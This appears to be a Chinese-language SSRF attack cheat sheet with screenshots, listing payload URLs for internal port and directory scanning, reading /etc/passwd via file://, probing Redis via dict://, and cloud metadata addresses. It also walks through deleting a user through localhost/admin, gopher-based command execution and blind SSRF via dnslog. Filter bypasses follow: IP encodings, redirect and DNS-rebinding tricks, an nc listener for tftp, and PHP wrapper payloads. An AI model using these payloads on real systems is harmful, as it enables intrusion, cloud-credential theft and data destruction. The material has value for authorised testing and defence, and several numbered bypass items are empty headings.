SSRF(Server-Side Request Forgery：服务器端请求伪造)是一种由攻击者构造形成，由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统)

但是实战中我们遇见更多的是不出网的SSRF，此时我们可以借助SSRF对其目标进行内网端口扫描，文件读取，以及目录扫描

探内网端口  
目录扫描：http://www.xxx.com/?url=http://127.0.0.1/扫描地址  
端口扫描1：http://www.xxx.com/?url=http://127.0.0.1:枚举的端口号/  
端口扫描2：http://www.xxx.com/?url=dict://127.0.0.1:枚举的端口号  

通过协议进行文件读取：http://www.xxx.com/?url=file:///etc/passwd
通过dict协议：探测端口  
http://127.0.0.1/code1.php?url=dict://127.0.0.1:6379


读云上元数据  
其中，端口与目录扫描可以帮助我们对目标的未授权访问漏洞，以及网站指纹进行探测，这里注意一点如果目标资产部署在云上的话，这是我们尝读取元数据  
参考文章：https://mp.weixin.qq.com/s/QzKiStUY1Y3KyrWm8Bvq1A
参考文章：https://mp.weixin.qq.com/s/FfMoxqyGjhptXvn-SMrVkA

此处给出各大云厂商元数据地址

参考链接：https://www.cnblogs.com/zpchcbd/p/17839539.html

阿里云元数据地址：http://100.100.100.200/

腾讯云元数据地址：http://metadata.tencentyun.com/

华为云元数据地址：http://169.254.169.254/

亚马云元数据地址：http://169.254.169.254/

微软云元数据地址：http://169.254.169.254/

谷歌云元数据地址：http://metadata.google.internal/

-----
具体利用场景

<img width="1150" height="581" alt="image" src="https://github.com/user-attachments/assets/2a2d8f39-5337-4262-b219-53668a2126fb" />

1通过对传参信息URL进行URL解码，可以发现传参内容
<img width="1166" height="589" alt="image" src="https://github.com/user-attachments/assets/116f1a97-f5f0-4091-b5e4-7a530056608a" />

尝试将传参内容替换为http://localhost/admin，进行重放测试（其实也可改baidu 证明能回显即可）
<img width="1156" height="707" alt="image" src="https://github.com/user-attachments/assets/4fa472ba-acec-4429-b990-16e1db5b2f8b" />

请求删除用户carlos地址，证明可删
<img width="1140" height="644" alt="image" src="https://github.com/user-attachments/assets/498c344d-6c09-4464-bc57-4ab60aed9e37" />

2还可以爆c段，也许同一出网口，均存在ssrf
<img width="639" height="640" alt="image" src="https://github.com/user-attachments/assets/f448cc80-cdb4-4e26-b965-6b7dec9cd0b6" />

3目录扫描（ssrf探测内网存在的接口）
<img width="813" height="674" alt="image" src="https://github.com/user-attachments/assets/16737669-c56a-442d-95f7-3faf8fc7848c" />

4 post表单，gopher协议执行命令
<img width="1371" height="1309" alt="image" src="https://github.com/user-attachments/assets/35502320-6994-4386-a4d0-d8807c10f051" />

5 xml表单，file协议执行命令
<img width="856" height="515" alt="image" src="https://github.com/user-attachments/assets/33ec0358-f981-40bc-b93e-fb1029b02b64" />

6 根据该版本信息，我们可以尝试进行任意文件写入（CVE-2017-12615）



------
外带检测盲SSRF

发现响应包没有任何回显，改referer转战dnslog平台证明
抓包，改referer替换为自己生成的域名，发送请求包，去看dnslog是否有http交互记录
<img width="1147" height="466" alt="image" src="https://github.com/user-attachments/assets/f4e524df-2c94-41ee-a7b5-d127036687eb" />

----
ip归属云服务器，尝试获取云数据

----
绕过方法

1 http://baidu.com@www.baidu.com/ ==> http://www.baidu.com/  
http://baidu.com@127.0.0.1/ ==> http://127.0.0.1/  
http://www.baidu.com#127.0.0.1/ ==> http://www.baidu.com/  
http://127.0.0.1#www.baidu.com/ ==> http://127.0.0.1/  

2 ip地址转换  
10进制格式：192.168.0.1  
10进制整数格式：3232235521  
8进制格式：0300.0250.0.1  
8进制整数格式：030052000001 (整数16转8，或10转8，第一个0表示8进制)  
16进制格式：0xC0.168.0.1 / 0xC0.0xA8.0x00.0x01  
16进制整数格式：0xC0A80001 (0x表示16进制)  
合并后两位：192.168.1 / 192.168.a.b ==> 192.168.(256*a+b)  
合并后三位：192.11010049 / 192.a.b.c ==> 192.(65536*a+256*b+c)  

3 URL跳转绕过  
http://httpbin.org/redirect-to?url=http://www.baidu.com/  
PS:常用跳转有301，302和307，307跳转会转发POST请求中的数据，但301.302跳转不会。  

4 .DNS 重绑定绕过
①注册一个域名，在托管DNS服务器上，将缓存保持时间即TTL设置为0，并配置解析IP；

②客户端进行SSRF请求，服务器端获得域名参数，执行第一次DNS解析，获取到一个非内网的IP；

③对获取的IP进行判断，发现为指定范围IP，则通过验证；

④服务器端才正式对域名进行访问，此时DNS解析的 IP 设为内网 IP，由于DNS服务器设置的TTL为0，所以这次DNS服务器返回的是内网IP；

⑤由于已经绕过验证，所以服务器端直接返回访问内网资源的内容。

8.封闭式字母、数字、字符绕过  
PS：封闭式字母数字是一个由字母数字组成的Unicode印刷符号块，使用这些符号块替换域名中的字母也可以被浏览器接受。
9."."字符替换绕过

10.本地回环地址绕过

PS：ipv6的地址使用http访问需要加[]

11.协议绕过
（1）常用协议绕过
File  
test?url=file:///192.168.0.1:8080/

Dict  
dict://<user-auth>@<host>:<port>/d:<word>test?url=dict://192.168.0.1:8080/info

SFTP  
test?url=sftp://192.168.0.1:8080/

TFTP  
Server:# nc -lvup 8080  
test?url=tftp://[ServerIP]:8080/TESTUDPPACKET

LDAP或ldaps或ldapi  
test?url=ldap://localhost:8080/%0astats%0aquithttp://192.168.0.1:8080/  
test?url=ldaps://localhost:8080/%0astats%0aquithttp://192.168.0.1:8080/  
test?url=ldapi://localhost:8080/%0astats%0aquithttp://192.168.0.1:8080/  

Gopher  
test?url=gopher://192.168.0.1:8080/_GET%20/test.php%3fname=test%20HTTP/1.1%0d%0AHost:%20192.168.0.1%0d%0A  
test?url=gopher://192.168.0.1:8080/_POST%20/test.php%20HTTP/1.1%0d%0AHost:192.168.0.1%0d%0A%0d%0Aname=test%0d%0A  

//填充位   _ (_GET、_POST)  
//空格    %20   
//问号    %3f  
//换行符  %0d%0A  
//数据包末尾要加换行符(%0d%0A)表示结束  
（2）PHP独有协议——仅参考了解  

php:  
file.php?file=php://filter/convert.base64-encode/resource=file:///etc/passwd  
file.php?file=php://input  [post body]<?php phpinfo()?> //请求input带body内容  

data:  
file.php?file=data://text/plain;base64,ZmlsZTovLy9jOi8xLnR4dA==  

压缩包类:  
phar:phar://压缩包/内部文件  
file.php?file=phar://xxx.png/123.php  

zip:  
zip://[压缩文件绝对路径]#[压缩文件内的子文件名]  //其中get请求中#需要进行编码，即%23  
file.php?file=zip://123.png%23test.php   

compress.bzip2  
file.php?file=compress.bzip2://./123.jpg  
file.php?file=compress.bzip2://D:/phpStudy/WWW/123.jpg    

compress.zlib  
file.php?file=compress.zlib://./123.jpg  
file.php?file=compress.zlib://D:/phpStudy/WWW/123.jpg  




